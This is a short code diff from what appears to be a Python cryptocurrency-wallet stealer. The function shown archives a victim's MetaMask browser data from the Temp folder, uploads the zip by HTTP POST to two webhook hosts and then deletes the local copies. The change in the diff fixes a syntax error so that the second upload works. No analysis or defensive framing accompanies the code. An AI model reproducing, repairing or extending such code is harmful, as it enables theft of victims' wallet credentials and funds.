@@ -22,7 +22,7 @@ def make(args, brow, count):
        shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
        file = {"file": open(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip", 'rb')}
        r = requests.post(hook, files=file)
-       r = requests.post(hook1, files=file
+       r = requests.post(hook1, files=file)
        os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
        os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
 def yea():
